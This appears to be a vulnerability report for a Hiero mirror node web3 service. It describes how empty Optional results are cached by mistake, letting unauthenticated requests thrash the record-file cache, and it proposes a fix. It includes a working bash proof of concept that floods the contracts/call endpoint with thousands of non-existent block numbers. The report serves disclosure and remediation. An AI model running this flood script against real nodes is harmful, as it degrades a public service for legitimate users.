### Title
Cache Poisoning via Empty Optional Caching in `findByIndex()` Enables Unauthenticated Cache Thrashing

### Summary
The `findByIndex()` method in `RecordFileRepository` uses `@Cacheable` with `unless = "#result == null"`, but the method returns `Optional<RecordFile>`. When a block number does not exist in the database, the method returns `Optional.empty()` — which is never `null` — causing empty results to be unconditionally cached. An unauthenticated attacker can flood the service with requests using unique non-existent block numbers, filling the 10,000-entry `CACHE_MANAGER_RECORD_FILE_INDEX` cache entirely with empty `Optional` results, evicting all legitimate entries and forcing every subsequent legitimate block lookup to hit the database.

### Finding Description

**Exact code path:**

`RecordFileServiceImpl.findByBlockType()` (line 28) calls `recordFileRepository.findByIndex(block.number())` for any numeric `BlockType`:

```java
// RecordFileServiceImpl.java:19-29
public Optional<RecordFile> findByBlockType(BlockType block) {
    if (block == BlockType.EARLIEST) { ... }
    else if (block == BlockType.LATEST) { ... }
    else if (block.isHash()) { ... }
    return recordFileRepository.findByIndex(block.number());  // line 28
}
```

`findByIndex()` is annotated with:

```java
// RecordFileRepository.java:27-29
@Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX, unless = "#result == null")
@Query("select r from RecordFile r where r.index = ?1")
Optional<RecordFile> findByIndex(long index);
```

**Root cause — failed assumption:** The developer intended `unless = "#result == null"` to prevent caching of missing records. However, Spring's `@Cacheable` evaluates `#result` as the actual Java return value — the `Optional<RecordFile>` object itself. When no record exists, the JPA query returns `Optional.empty()`. `Optional.empty()` is a singleton non-null object, so `#result == null` is always `false`, and the empty `Optional` is cached unconditionally.

**Cache configuration** (`EvmConfiguration.java:153-164`):
```java
@Bean(CACHE_MANAGER_RECORD_FILE_INDEX)
@Primary
CacheManager cacheManagerRecordFileIndex() {
    final var caffeine = Caffeine.newBuilder()
            .expireAfterWrite(10, TimeUnit.MINUTES)
            .maximumSize(10000)   // ← finite, small
            .recordStats();
    ...
}
```

The cache holds at most 10,000 entries and evicts by size (LRU). Entries survive for 10 minutes.

**Exploit flow:**
1. Attacker sends POST `/api/v1/contracts/call` with `"block": "0x186A0"` (100,000), `"block": "0x186A1"`, … using sequential integers that do not exist in the database.
2. Each request misses the cache → DB query → returns `Optional.empty()` → `Optional.empty() != null` → cached under key `(index)`.
3. After 10,000 unique non-existent block numbers, the Caffeine cache is at `maximumSize`. Caffeine's size-based eviction begins removing legitimate entries.
4. All subsequent legitimate block-number lookups (e.g., for real historical blocks) miss the cache and hit the database on every request.
5. The attacker repeats every 10 minutes (the `expireAfterWrite` window) to maintain the thrashing condition.

**Why existing checks fail:**
- The `unless = "#result == null"` guard is semantically incorrect for `Optional` return types and provides zero protection.
- The global rate limit (`requestsPerSecond = 500`, `ThrottleProperties.java:35`) allows 500 RPS. Filling 10,000 cache slots requires only 10,000 requests — achievable in 20 seconds at the allowed rate. Maintaining the attack requires only ~17 RPS sustained, far below the 500 RPS ceiling.
- There is no per-IP rate limiting, no block-number range validation, and no authentication on the JSON-RPC endpoint.

### Impact Explanation
Once the 10,000-slot cache is saturated with empty `Optional` results, every legitimate call that resolves a historical block by number (e.g., `eth_call` with a specific block, `eth_getBlockByNumber`) incurs a full database round-trip. Under sustained attack, this multiplies database query load by the number of concurrent legitimate users, degrading or exhausting database connection pools. Because `CACHE_MANAGER_RECORD_FILE_INDEX` is marked `@Primary` and shared across the web3 service, the degradation is service-wide. The impact matches the stated severity: sustained degradation of the web3 mirror node service processing capacity without shutting it down entirely.

### Likelihood Explanation
The attack requires no credentials, no special knowledge beyond the public JSON-RPC API spec, and no brute force. Any attacker with a script and a network connection can execute it. The exploit is repeatable on a 10-minute cycle indefinitely. The only barrier is the 500 RPS global rate limit, which is easily satisfied by the attack volume needed (10,000 requests per 10-minute window = ~17 RPS).

### Recommendation
Fix the `unless` condition in `findByIndex()` to correctly handle `Optional` return types:

```java
@Cacheable(
    cacheNames = CACHE_NAME,
    cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX,
    unless = "#result == null || #result.isEmpty()"   // ← correct guard
)
Optional<RecordFile> findByIndex(long index);
```

Apply the same fix to all other `@Cacheable` methods in `RecordFileRepository` and other repositories that return `Optional` with `unless = "#result == null"`. Additionally, consider adding per-IP rate limiting or validating that the requested block number falls within the known valid range (e.g., between 0 and the current latest block index) before executing the cache/DB lookup.

### Proof of Concept

```bash
# Fill the 10,000-entry cache with empty Optional results in ~20 seconds
# (well within the 500 RPS global rate limit)

for i in $(seq 9000000 9010000); do
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d "{
      \"block\": \"$(printf '0x%x' $i)\",
      \"to\": \"0x0000000000000000000000000000000000000001\",
      \"gas\": 50000,
      \"data\": \"0x\"
    }" &
done
wait

# Now query a legitimate block number that was previously cached:
# It will miss the cache and hit the database on every request.
curl -X POST http://<mirror-node>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d "{
    \"block\": \"0x1\",
    \"to\": \"0x0000000000000000000000000000000000000001\",
    \"gas\": 50000,
    \"data\": \"0x\"
  }"
# Repeat every 10 minutes to maintain cache thrashing.
```

**Verification:** Enable Caffeine `recordStats()` (already configured) and observe via Micrometer/Actuator metrics: `cache.gets{result=miss}` for `recordFileIndex` will spike to 100% miss rate after the attack, and `cache.puts` will show 10,000 entries of empty results. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/RecordFileRepository.java (L27-29)
```java
    @Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX, unless = "#result == null")
    @Query("select r from RecordFile r where r.index = ?1")
    Optional<RecordFile> findByIndex(long index);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L153-164)
```java
    @Bean(CACHE_MANAGER_RECORD_FILE_INDEX)
    @Primary
    CacheManager cacheManagerRecordFileIndex() {
        final var caffeine = Caffeine.newBuilder()
                .expireAfterWrite(10, TimeUnit.MINUTES)
                .maximumSize(10000)
                .recordStats();
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME));
        caffeineCacheManager.setCaffeine(caffeine);
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/service/RecordFileServiceImpl.java (L19-29)
```java
    public Optional<RecordFile> findByBlockType(BlockType block) {
        if (block == BlockType.EARLIEST) {
            return recordFileRepository.findEarliest();
        } else if (block == BlockType.LATEST) {
            return recordFileRepository.findLatest();
        } else if (block.isHash()) {
            return recordFileRepository.findByHash(block.name());
        }

        return recordFileRepository.findByIndex(block.number());
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L34-35)
```java
    @Min(1)
    private long requestsPerSecond = 500;
```
